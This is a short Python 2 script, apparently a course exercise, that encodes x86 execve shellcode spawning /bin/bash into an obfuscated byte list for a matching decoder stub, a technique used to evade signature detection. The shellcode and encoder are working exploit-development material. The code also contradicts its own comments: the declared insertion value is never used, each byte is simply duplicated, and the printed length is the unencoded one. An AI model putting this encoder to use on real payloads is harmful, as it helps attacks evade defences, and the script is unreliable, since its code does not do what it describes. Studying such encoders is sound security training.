#!/usr/bin/python

# Python Insertion Encoder 

# input shellcode, for this exercise the execve-stack shellcode
shellcode = ("\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

# the value that is wished to be inserted, can be changed to a required value
insertionvalue = 0x10

# the value that signals the end of the shellcode, make sure this is not the same as 'insertionvalue'
endvalue = '0xaa,0xaa'

# setting encoded to be populated in the upcoming loop
encoded = ""

print 'Encoded shellcode ... \n'

#loop through shellcode inserting the 'insertionvalue' inbetween
for x in bytearray(shellcode) :

	encoded += '0x' 			                  # add 0x to 'encoded'
	encoded += '%02x,' %x                   # add first shellcode byte in hex format (02x) and a comma
	encoded += '0x'                         # duplicate the above
	encoded += '%02x,' %x


encoded += endvalue				# add 'endvalue' to shellcode so the decoder knows when to stop

print encoded + '\n'				# print 'encoded'


print 'Total length of encoded shellcode is - %d' % len(bytearray(shellcode))
